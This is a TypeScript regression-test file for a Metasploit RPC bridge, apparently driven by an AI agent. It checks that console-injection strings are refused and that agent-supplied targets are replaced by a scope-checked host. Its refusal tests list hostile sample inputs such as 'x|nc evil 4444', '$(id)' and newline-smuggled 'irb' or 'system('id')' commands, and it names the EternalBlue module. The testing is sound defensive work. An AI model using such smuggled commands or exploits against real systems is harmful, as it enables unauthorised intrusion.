/**
 * MSF console-injection regressions (audit 2026-10-09, Batch 1 item 1).
 *
 * The msf console executes one command per line, so every string the
 * bridge writes (`use …`, `set K V`, `set PAYLOAD`, `set CMD`) is a
 * potential command-injection vector when it comes from the agent or a
 * target. Proven here, against an in-process fake msfrpcd (real msgpack
 * wire protocol, no network, no Metasploit):
 *  - option/module/payload/CMD strings carrying newlines, whitespace,
 *    control characters or console metacharacters are REFUSED, and the
 *    refusal lands before any msfrpcd packet (zero calls recorded)
 *  - agent-supplied target options (RHOSTS/RHOST/RHOSTS_FILE, any case)
 *    never reach the console: the scope-checked host is forced, for
 *    auxiliary modules too, not just exploits
 *  - the client itself throws before creating a console (defense in
 *    depth for direct MsfClient callers)
 */

import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { encode, decode } from "@msgpack/msgpack";
import { MsfClient, checkMsfConsoleInputs, forceMsfTargetOptions } from "../src/msf/client.js";
import { MsfExecutor, type MsfRequestFn } from "../src/msf/index.js";

const FAKE_ENV: NodeJS.ProcessEnv = {
  REDTEAM_MSFRPC_HOST: "127.0.0.1",
  REDTEAM_MSFRPC_PORT: "55553",
  REDTEAM_MSFRPC_USER: "msf",
  REDTEAM_MSFRPC_PASS: "msf-test-secret-pw",
  REDTEAM_MSFRPC_TLS: "0",
};

const SCOPE = ["10.9.0.12"];

// ---------------------------------------------------------------------------
// In-process fake msfrpcd — speaks msgpack RPC, records every call/write
// ---------------------------------------------------------------------------

interface FakeRpc {
  request: MsfRequestFn;
  calls: { method: string; args: unknown[] }[];
  writes: string[];
}

function makeFakeRpc(markerEcho = "REDTEAM-MARKER-abc123"): FakeRpc {
  const calls: { method: string; args: unknown[] }[] = [];
  const writes: string[] = [];
  const request: MsfRequestFn = async (body) => {
    const decoded = decode(body) as unknown[];
    const [method, maybeToken, ...rest] = decoded;
    const m = String(method);
    const args = m === "auth.login" ? [maybeToken, ...rest] : rest;
    calls.push({ method: m, args });
    switch (m) {
      case "auth.login": {
        const [user, pass] = args as [string, string];
        return user === FAKE_ENV.REDTEAM_MSFRPC_USER && pass === FAKE_ENV.REDTEAM_MSFRPC_PASS
          ? encode({ result: "success", token: "fake-token-123" })
          : encode({ result: "failed", error: "login failed" });
      }
      case "console.create":
        return encode({ id: "cid-1", prompt: "msf6 > " });
      case "console.write": {
        const data = String(args[1]);
        writes.push(data);
        return encode({ wrote: data.length });
      }
      case "console.read": {
        const ran = writes.some((w) => w.trim() === "run");
        return encode({
          data: ran ? `[*] Running...\n${markerEcho}\n[*] Done\n` : "",
          prompt: "msf6 > ",
          busy: false,
        });
      }
      case "console.destroy":
        return encode({ result: "success" });
      case "session.list":
        return encode({});
      case "session.stop":
        return encode({ result: "success" });
      default:
        return encode({ error: `unknown ${m}` });
    }
  };
  return { request, calls, writes };
}

// ---------------------------------------------------------------------------
// Pure input checks
// ---------------------------------------------------------------------------

describe("checkMsfConsoleInputs", () => {
  const base = {
    moduleType: "exploit",
    fullname: "windows/smb/ms17_010_eternalblue",
    options: { RHOSTS: "10.9.0.12", RPORT: "445" },
    payload: "cmd/unix/generic",
    cmd: "echo REDTEAM-MARKER-abc123",
  };

  it("allows a plain canary run input", () => {
    assert.equal(checkMsfConsoleInputs(base), null);
    assert.equal(
      checkMsfConsoleInputs({
        ...base,
        options: { RPORT: "445", SMBUser: "svc-backup", HttpPassword: "p@ss:word/x=y,z" },
      }),
      null,
    );
  });

  it("refuses option values carrying newline/control/whitespace injection", () => {
    const evil = [
      "445\nirb",
      "445\rirb",
      "445\tirb",
      "445 irb",
      "10.0.0.5\nextra",
      "x;irb",
      "x`id`",
      "$(id)",
      "x|nc evil 4444",
      "x&calc",
      'a"b',
      "a'b",
      "a\\b",
      "a\x07b",
      "a\x1b[31m",
      "a(b)",
      "a{b}",
      "a<b>",
      "!id",
    ];
    for (const v of evil) {
      const r = checkMsfConsoleInputs({ ...base, options: { RPORT: v } });
      assert.ok(r?.includes("unsafe value"), `value ${JSON.stringify(v)} refused, got: ${r}`);
    }
  });

  it("refuses unsafe option keys", () => {
    for (const k of ["RHOSTS EXTRA", "RH OSTS", "1RPORT", "", "KEY;id", "KEY\nid", "KEY id"]) {
      const r = checkMsfConsoleInputs({ ...base, options: { [k]: "1" } });
      assert.ok(r?.includes("unsafe option key"), `key ${JSON.stringify(k)} refused, got: ${r}`);
    }
    assert.equal(
      checkMsfConsoleInputs({ ...base, options: { RPORT: "445", SMBUser: "x", "HTTP::uri_encode_mode": "none" } }),
      null,
    );
  });

  it("refuses unsafe module names", () => {
    const evil = [
      "windows/smb/x\nirb",
      "windows/smb/x;irb",
      "windows smb x",
      "/windows/smb/x",
      "windows//smb",
      "windows/../x",
      "../x",
      "",
    ];
    for (const f of evil) {
      const r = checkMsfConsoleInputs({ ...base, fullname: f });
      assert.ok(r?.includes("unsafe module name"), `module ${JSON.stringify(f)} refused, got: ${r}`);
    }
    assert.equal(checkMsfConsoleInputs({ ...base, fullname: "scanner/smb/smb_enumshares" }), null);
  });

  it("refuses unsafe payload and CMD strings", () => {
    assert.ok(checkMsfConsoleInputs({ ...base, payload: "cmd/unix/generic\nirb" })?.includes("unsafe payload"));
    assert.ok(checkMsfConsoleInputs({ ...base, payload: "cmd/unix/gen eric" })?.includes("unsafe payload"));
    assert.ok(checkMsfConsoleInputs({ ...base, cmd: "echo X\nirb" })?.includes("unsafe CMD"));
    assert.ok(checkMsfConsoleInputs({ ...base, cmd: "echo X; irb" })?.includes("unsafe CMD"));
    assert.ok(checkMsfConsoleInputs({ ...base, cmd: "echo $(id)" })?.includes("unsafe CMD"));
    assert.ok(checkMsfConsoleInputs({ ...base, cmd: "echo X\r\nexit" })?.includes("unsafe CMD"));
  });

  it("refuses non-exploit/auxiliary module types even from untyped callers", () => {
    assert.ok(checkMsfConsoleInputs({ ...base, moduleType: "post" })?.includes("module type"));
    assert.ok(checkMsfConsoleInputs({ ...base, moduleType: "exploit\n" })?.includes("module type"));
  });
});

describe("forceMsfTargetOptions", () => {
  it("checked host wins over every agent-supplied target key, any case", () => {
    const input = { RHOSTS: "10.99.0.99", rhost: "10.98.0.98", Rhosts_File: "/tmp/targets", RPORT: "445" };
    const out = forceMsfTargetOptions(input, "10.9.0.12");
    assert.equal(out["RHOSTS"], "10.9.0.12");
    assert.deepEqual(Object.keys(out).sort(), ["RHOSTS", "RPORT"]);
    assert.equal(input["RHOSTS"], "10.99.0.99", "caller object not mutated");
  });

  it("forces RHOSTS even when the agent supplied nothing", () => {
    assert.deepEqual(forceMsfTargetOptions(undefined, "10.9.0.12"), { RHOSTS: "10.9.0.12" });
    assert.deepEqual(forceMsfTargetOptions({}, "2001:db8::5"), { RHOSTS: "2001:db8::5" });
  });
});

// ---------------------------------------------------------------------------
// Executor end-to-end against the fake
// ---------------------------------------------------------------------------

describe("MsfExecutor console-injection regressions", () => {
  const exec = (fake: FakeRpc) => new MsfExecutor({ request: fake.request, env: { ...FAKE_ENV } });

  it("agent-supplied RHOSTS/RHOST never reach the console — checked host wins", async () => {
    const fake = makeFakeRpc();
    const res = await exec(fake).run({
      host: "10.9.0.12", scopeHosts: SCOPE, moduleType: "exploit",
      module: "windows/smb/ms17_010_eternalblue", marker: "abc123",
      options: { RHOSTS: "10.99.0.99", RHOST: "10.98.0.98", rhosts_file: "/tmp/targets", RPORT: "445" },
    });
    assert.equal(res.ok, true, res.summary);
    assert.deepEqual(
      fake.writes.filter((w) => /^set RHOSTS /.test(w)),
      ["set RHOSTS 10.9.0.12\n"],
      "exactly one RHOSTS line, carrying the scope-checked host",
    );
    const all = fake.writes.join("");
    assert.ok(!all.includes("10.99.0.99"), "agent RHOSTS gone");
    assert.ok(!all.includes("10.98.0.98"), "agent RHOST gone");
    assert.ok(!all.toLowerCase().includes("rhosts_file"), "RHOSTS_FILE gone");
    assert.ok(!all.includes("/tmp/targets"), "agent target-file path gone");
    assert.ok(fake.writes.includes("set RPORT 445\n"), "benign options kept");
  });

  it("auxiliary runs are target-forced too (not just exploits)", async () => {
    const fake = makeFakeRpc();
    const res = await exec(fake).run({
      host: "10.9.0.12", scopeHosts: SCOPE, moduleType: "auxiliary",
      module: "scanner/smb/smb_enumshares", marker: "abc123",
      options: { RHOSTS: "10.99.0.99" },
    });
    assert.equal(res.ok, true, res.summary);
    assert.ok(fake.writes.includes("set RHOSTS 10.9.0.12\n"));
    assert.ok(!fake.writes.join("").includes("10.99.0.99"));
  });

  it("newline in an option value is refused BEFORE any msfrpcd request", async () => {
    const fake = makeFakeRpc();
    const res = await exec(fake).run({
      host: "10.9.0.12", scopeHosts: SCOPE, moduleType: "exploit",
      module: "windows/smb/ms17_010_eternalblue", marker: "abc123",
      options: { RPORT: "445\nirb\nsystem('id')" },
    });
    assert.equal(res.ok, false);
    assert.ok(res.refused?.includes("unsafe value"), res.refused ?? "no refusal recorded");
    assert.equal(fake.calls.length, 0, "refusal is preflight — not even an auth packet");
  });

  it("newline in the module name is refused BEFORE any msfrpcd request", async () => {
    const fake = makeFakeRpc();
    const res = await exec(fake).run({
      host: "10.9.0.12", scopeHosts: SCOPE, moduleType: "exploit",
      module: "windows/smb/ms17_010_eternalblue\nirb", marker: "abc123",
    });
    assert.equal(res.ok, false);
    assert.ok(res.refused?.includes("unsafe module name"), res.refused ?? "no refusal recorded");
    assert.equal(fake.calls.length, 0);
  });

  it("metacharacters in the payload string are refused BEFORE any msfrpcd request", async () => {
    const fake = makeFakeRpc();
    const res = await exec(fake).run({
      host: "10.9.0.12", scopeHosts: SCOPE, moduleType: "exploit",
      module: "windows/smb/ms17_010_eternalblue", payload: "cmd/unix/generic\nirb", marker: "abc123",
    });
    assert.equal(res.ok, false);
    assert.ok(res.refused, "refused (payload policy or console check)");
    assert.equal(fake.calls.length, 0);
  });
});

// ---------------------------------------------------------------------------
// Client-level guard — direct MsfClient callers get the same protection
// ---------------------------------------------------------------------------

describe("MsfClient console guard", () => {
  it("throws before creating a console when a write-bound string is unsafe", async () => {
    const fake = makeFakeRpc();
    const client = new MsfClient(fake.request);
    await client.login(FAKE_ENV.REDTEAM_MSFRPC_USER!, FAKE_ENV.REDTEAM_MSFRPC_PASS!);
    await assert.rejects(
      client.runModuleConsole({
        moduleType: "exploit",
        fullname: "windows/smb/ms17_010_eternalblue",
        options: { RPORT: "445\nirb" },
        timeoutMs: 1000,
      }),
      /unsafe value/,
    );
    assert.equal(fake.calls.filter((c) => c.method === "console.create").length, 0, "no console created");
    assert.equal(fake.writes.length, 0, "nothing written");
  });

  it("a clean run writes exactly one literal line per console.write", async () => {
    const fake = makeFakeRpc();
    const client = new MsfClient(fake.request);
    await client.login(FAKE_ENV.REDTEAM_MSFRPC_USER!, FAKE_ENV.REDTEAM_MSFRPC_PASS!);
    const res = await client.runModuleConsole({
      moduleType: "exploit",
      fullname: "windows/smb/ms17_010_eternalblue",
      options: forceMsfTargetOptions({ RPORT: "445" }, "10.9.0.12"),
      payload: "cmd/unix/generic",
      cmd: "echo REDTEAM-MARKER-abc123",
      timeoutMs: 5000,
    });
    assert.ok(res.output.includes("REDTEAM-MARKER-abc123"));
    assert.equal(fake.writes[0], "use exploit/windows/smb/ms17_010_eternalblue\n");
    for (const w of fake.writes) {
      assert.ok(w.endsWith("\n") && !w.slice(0, -1).includes("\n"), `single line per write: ${JSON.stringify(w)}`);
    }
    assert.ok(fake.writes.includes("set RHOSTS 10.9.0.12\n"));
    assert.ok(fake.writes.includes("set CMD echo REDTEAM-MARKER-abc123\n"));
  });
});
